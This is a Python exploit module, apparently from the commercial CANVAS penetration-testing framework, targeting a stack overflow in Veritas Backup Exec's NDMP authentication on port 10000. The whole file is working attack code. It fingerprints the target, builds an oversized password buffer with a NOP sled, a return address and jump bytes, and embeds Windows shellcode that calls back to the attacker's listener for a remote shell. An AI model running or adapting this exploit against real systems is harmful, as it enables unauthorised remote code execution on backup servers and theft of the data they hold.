#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""

Veritas Decrypt Exploit

"""

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
      
from exploitutils import *
from libs import ndmp
from tcpexploit import tcpexploit


DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Symantec"
DOCUMENTATION["Notes"]="Remote exploit against Veritas Backup Exec"
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"

DESCRIPTION="Veritas Backup Exec stack overflow"
VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]

NAME="Veritas_Decrypt"

NOTES="""
    
"""

CHANGELOG="""

"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name         = NAME
        self.port         = 10000
        self.host         = ""
        self.shellcode    = "\xcc" * 298
        self.badstring    = "\x00"
        self.ssl          = 0
        self.version_info = ("Veritas ", 0x490464F, 0x0)
        
    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def createShellcode(self):
        host = self.callback.ip
        port = self.callback.port
        return self.createWin32Shellcode(self.badstring, host, port)
        
    def test(self):
        """
        for now, we just test the port to see if it is open
        """
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))
        
        nd = ndmp.NDMP(getsock=self)
        p = nd.connect( self.host)
        p = nd.getServerInfo()
        self.log("Attacking remote: %s - %s %s" % (p.VendorName, p.ProductName, \
                 p.RevisionName))
        self.log("This test is not precise at all - just a banner grabber")
        if p.VendorName.find("VERITAS") > -1:
            return 1
        return 0
    
    def run(self):
        """
        """
        self.host=self.target.interface
        self.port=self.argsDict.get("port", self.port)
        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port))

        st = 0
        for rt in range(0, 5):
            nd = ndmp.NDMP(getsock=self, covertness = self.covertness)

            try:
                p=nd.connect( self.host, self.port)
                p=nd.getServerInfo()
            except:
                self.log("veritas_decrypt - network error, retrying")
                pass
            else:
                st = 1
                break

        if st == 0:
            self.setInfo("%s attacking %s:%d (failed - network error)"%(self.name,self.host,self.port),\
                        showlog=True)
            return 0


        self.log("Attacking remote: %s - %s %s" % (p.VendorName, p.ProductName, \
                 p.RevisionName))

        import struct
        from MOSDEF import mosdef

        password  = "\x42" * 2000
        password += "\x90" * (3700 - len(password))
        password += self.shellcode
        password += "\x42" * (4524 - len(password))
        password += "\x90\x90\xEB\x04"
        password += struct.pack("<L", self.version_info[1])
        password += "\xE9\x13\xFB\xFF\xFF"
        password += "\x45" * (8192 - len(password))

    
        try:
            p=nd.ConnectClientAuth(3, "Hola", password)
        except timeoutsocket.Timeout:
            pass
        except:
            self.log('Error during auth sequence, is DEP enabled?')
        
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)"%(self.name,self.host,self.port), showlog=True)
            self.log("%s done (succeeded!)"%self.name)
            return 1

        self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port),\
                     showlog=True)
        return 0
    
def usage():
    print "Usage: "+sys.argv[0]+" -t target [-p port:10000] -l localip -d localport "
    app=theexploit()


if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
